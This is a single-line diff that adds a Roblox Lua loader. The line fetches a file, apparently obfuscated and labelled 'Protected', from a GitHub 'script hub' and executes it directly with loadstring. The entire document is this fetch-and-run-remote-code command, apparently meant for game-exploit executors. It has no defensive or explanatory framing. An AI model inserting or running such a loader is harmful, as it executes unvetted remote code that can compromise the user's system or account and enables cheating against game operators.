@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/OfficiallyMelon/melons_script_hub/raw/main/Protected_1436831316964821.txt"))()
